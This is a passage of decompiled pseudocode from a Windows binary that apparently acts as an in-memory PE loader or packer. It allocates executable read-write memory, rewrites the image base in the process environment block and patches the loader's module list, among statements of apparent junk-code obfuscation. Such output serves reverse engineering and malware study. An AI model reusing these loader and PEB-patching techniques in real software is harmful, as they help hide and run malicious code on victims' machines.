		Mem644[0x004040F0:word32] = MapViewOfFileEx(Mem642[esp_371 - 44 + 0x00:HANDLE], Mem642[esp_371 - 0x28 + 0x00:DWORD], Mem642[esp_371 - 0x24 + 0x00:DWORD], Mem642[esp_371 - 0x20 + 0x00:DWORD], Mem642[esp_371 - 0x1C + 0x00:SIZE_T], Mem642[esp_371 - 0x18 + 0x00:LPVOID]);
	}
	word32 esp_401 = esp_112 - 0x30;
	if (Mem395[0x004040F0:word32] == 0x00)
	{
		word32 esp_479;
		dwLoc30 = dwLoc20 << (byte) (dwLoc24 *s dwLoc30);
		if (Mem395[0x004040E8:word32] != 0x00)
		{
			Mem562[esp_401 - 0x04 + 0x00:word32] = Mem395[0x004040D0:word32];
			esp_479 = esp_401 - 0x04;
			if (UnmapViewOfFile(Mem562[esp_401 - 0x04 + 0x00:LPCVOID]) == 0x00)
			{
				Mem574[esp_401 - 0x08 + 0x00:word32] = 0x8000;
				Mem576[esp_401 - 0x0C + 0x00:word32] = 0x00;
				Mem579[esp_401 - 0x10 + 0x00:word32] = Mem576[0x004040D0:word32];
				esp_479 = esp_401 - 0x10;
				if (VirtualFree(Mem579[esp_401 - 0x10 + 0x00:LPVOID], Mem579[esp_401 - 0x0C + 0x00:SIZE_T], Mem579[esp_401 - 0x08 + 0x00:DWORD]) == 0x00)
				{
					eax_269 = 0x00;
					return eax_269;
				}
			}
		}
		else
		{
			Mem591[esp_401 - 0x04 + 0x00:word32] = Mem395[edx_186 + 0x34:word32];
			esp_479 = esp_401 - 0x04;
			if (UnmapViewOfFile(Mem591[esp_401 - 0x04 + 0x00:LPCVOID]) == 0x00)
			{
				Mem597[esp_401 - 0x08 + 0x00:word32] = 0x8000;
				Mem599[esp_401 - 0x0C + 0x00:word32] = 0x00;
				Mem603[esp_401 - 0x10 + 0x00:word32] = Mem599[edx_186 + 0x34:word32];
				esp_479 = esp_401 - 0x10;
				if (VirtualFree(Mem603[esp_401 - 0x10 + 0x00:LPVOID], Mem603[esp_401 - 0x0C + 0x00:SIZE_T], Mem603[esp_401 - 0x08 + 0x00:DWORD]) == 0x00)
				{
					eax_269 = 0x00;
					return eax_269;
				}
			}
		}
		if (Mem395[0x004040E8:word32] != 0x00)
		{
			word32 esp_528 = esp_479 - 0x04;
			Mem529[esp_528 + 0x00:word32] = Mem395[0x004040D0:word32];
			Mem531[esp_528 - 0x04 + 0x00:word32] = 0x00;
			Mem533[esp_528 - 0x08 + 0x00:word32] = 0x00;
			Mem535[esp_528 - 0x0C + 0x00:word32] = 0x00;
			Mem537[esp_528 - 0x10 + 0x00:word32] = 0x22;
			Mem540[esp_528 - 0x14 + 0x00:word32] = eax_385;
			Mem542[0x004040F0:word32] = MapViewOfFileEx(Mem540[esp_528 - 0x14 + 0x00:HANDLE], Mem540[esp_528 - 0x10 + 0x00:DWORD], Mem540[esp_528 - 0x0C + 0x00:DWORD], Mem540[esp_528 - 0x08 + 0x00:DWORD], Mem540[esp_528 - 0x04 + 0x00:SIZE_T], Mem540[esp_528 + 0x00:LPVOID]);
		}
		else
		{
			word32 esp_545 = esp_479 - 0x04;
			Mem546[esp_545 + 0x00:word32] = Mem395[edx_186 + 0x34:word32];
			Mem548[esp_545 - 0x04 + 0x00:word32] = 0x00;
			Mem550[esp_545 - 0x08 + 0x00:word32] = 0x00;
			Mem552[esp_545 - 0x0C + 0x00:word32] = 0x00;
			Mem554[esp_545 - 0x10 + 0x00:word32] = 0x22;
			Mem557[esp_545 - 0x14 + 0x00:word32] = eax_385;
			Mem559[0x004040F0:word32] = MapViewOfFileEx(Mem557[esp_545 - 0x14 + 0x00:HANDLE], Mem557[esp_545 - 0x10 + 0x00:DWORD], Mem557[esp_545 - 0x0C + 0x00:DWORD], Mem557[esp_545 - 0x08 + 0x00:DWORD], Mem557[esp_545 - 0x04 + 0x00:SIZE_T], Mem557[esp_545 + 0x00:LPVOID]);
		}
		esp_401 = esp_479 - 0x18;
		if (Mem395[0x004040F0:word32] == 0x00)
		{
			if (Mem395[0x004040E8:word32] != 0x00)
			{
				Mem501[esp_401 - 0x04 + 0x00:word32] = 0x40;
				Mem503[esp_401 - 0x08 + 0x00:word32] = 0x3000;
				Mem507[esp_401 - 0x0C + 0x00:word32] = Mem503[edx_186 + 0x50:word32];
				Mem510[esp_401 - 0x10 + 0x00:word32] = Mem507[0x004040D0:word32];
				Mem512[0x004040F0:word32] = VirtualAlloc(Mem510[esp_401 - 0x10 + 0x00:LPVOID], Mem510[esp_401 - 0x0C + 0x00:SIZE_T], Mem510[esp_401 - 0x08 + 0x00:DWORD], Mem510[esp_401 - 0x04 + 0x00:DWORD]);
			}
			else
			{
				Mem514[esp_401 - 0x04 + 0x00:word32] = 0x40;
				Mem516[esp_401 - 0x08 + 0x00:word32] = 0x3000;
				Mem520[esp_401 - 0x0C + 0x00:word32] = Mem516[edx_186 + 0x50:word32];
				Mem524[esp_401 - 0x10 + 0x00:word32] = Mem520[edx_186 + 0x34:word32];
				Mem526[0x004040F0:word32] = VirtualAlloc(Mem524[esp_401 - 0x10 + 0x00:LPVOID], Mem524[esp_401 - 0x0C + 0x00:SIZE_T], Mem524[esp_401 - 0x08 + 0x00:DWORD], Mem524[esp_401 - 0x04 + 0x00:DWORD]);
			}
			esp_401 = esp_479 - 0x28;
			if (Mem395[0x004040F0:word32] == 0x00)
			{
				eax_269 = 0x00;
				return eax_269;
			}
		}
	}
	Mem415[0x004040FC:word32] = 156494 << (byte) (Mem395[0x004040EC:word32] *s dwLoc08);
	word32 esp_418 = esp_401 - 0x04;
	Mem419[esp_418 + 0x00:word32] = Mem415[edx_186 + 0x50:word32];
	Mem422[esp_418 - 0x04 + 0x00:word32] = eax_33;
	Mem425[esp_418 - 0x08 + 0x00:word32] = Mem422[0x004040F0:word32];
	fn00401000(dwArg00, dwArg04, dwArg08);
	if (Mem425[0x004040E8:word32] != 0x00)
	{
		Mem455[esp_418 + 0x00:word32] = Mem425[0x004040F0:word32] + Mem425[edx_186 + 0x28:word32];
		Mem458[esp_418 - 0x04 + 0x00:word32] = Mem455[0x004040D0:word32];
		fn004024F0(dwArg00, dwArg04);
	}
	else
	{
		Mem463[esp_418 + 0x00:word32] = Mem425[0x004040F0:word32];
		fn004025E0(dwArg00);
	}
	Mem434[0x004040C4:word32] = dwLoc20 - 0x00060CA5;
	Mem438[0x004040F8:word32] = Mem434[0x004040F0:word32] + Mem434[edx_186 + 0x28:word32];
	Mem441[edx_186 + 0x28:word32] = Mem438[0x004040F8:word32];
	Mem447[0x004040C4:word32] = dwLoc30 >> (byte) Mem441[0x004040FC:word32];
	eax_269 = 0x01;
	return eax_269;
}

// 004024F0: void fn004024F0(Stack word32 dwArg04, Stack word32 dwArg08)
void fn004024F0(word32 dwArg04, word32 dwArg08)
{
	Mem11[0x004040FC:word32] = Mem0[0x004040EC:word32] - 0x000DC541 << ~0x08;
	word32 ecx_23 = Mem11[Mem11[Mem11[Mem11[0x004040F4:word32] + 0x30:word32] + 0x0C:word32] + 0x0C:word32];
	Mem34[0x004040FC:word32] = 0x000EDB03 >> (byte) Mem11[0x004040EC:word32] >> ~0xBF;
	word32 dwLoc18_24 = ecx_23;
	while (0x01 != 0x00)
	{
		word32 edx_64 = Mem34[0x004040C4:word32] + 642333 - Mem34[0x004040FC:word32] >> (byte) Mem34[0x004040EC:word32];
		if (dwLoc18_24 == 0x00)
			return;
		Mem75[0x004040FC:word32] = Mem34[0x004040C4:word32] *s edx_64 *s dwLoc24;
		if (Mem75[dwLoc18_24 + 0x18:word32] == dwArg04)
		{
			Mem84[dwLoc18_24 + 0x1C:word32] = dwArg08;
			return;
		}
		Mem88[0x004040C4:word32] = Mem75[0x004040C4:word32] - dwLoc24;
		word32 ecx_90 = Mem88[dwLoc18_24 + 0x00:word32];
		dwLoc18_24 = ecx_90;
		if (ecx_90 == ecx_23)
			return;
	}
}

// 004025E0: void fn004025E0(Stack word32 dwArg04)
void fn004025E0(word32 dwArg04)
{
	word32 eax_10 = Mem0[0x004040EC:word32] + dwLoc10;
	word32 eax_23 = Mem0[Mem0[0x004040F4:word32] + 0x30:word32];
	Mem26[0x004040C4:word32] = 0x0DDB;
	Mem30[eax_23 + 0x08:word32] = dwArg04;
	Mem37[0x004040C4:word32] = Mem30[0x004040FC:word32] + Mem30[0x004040EC:word32] << (byte) eax_10;
}

// 00402650: void fn00402650(Stack word32 dwArg04)
void fn00402650(word32 dwArg04)
{
	Mem13[0x004040EC:word32] = dwLoc0C *s dwLoc0C >> ~0x60;
	HeapFree(GetProcessHeap(), 0x00, dwArg04);
}

// 00402690: Register word32 fn00402690(Stack word32 dwArg04)
word32 fn00402690(word32 dwArg04)
{
	Mem15[0x004040C4:word32] = dwLoc10 + 102966 >> (byte) Mem0[0x004040C4:word32];
	return HeapAlloc(GetProcessHeap(), 0x00, dwArg04);
}

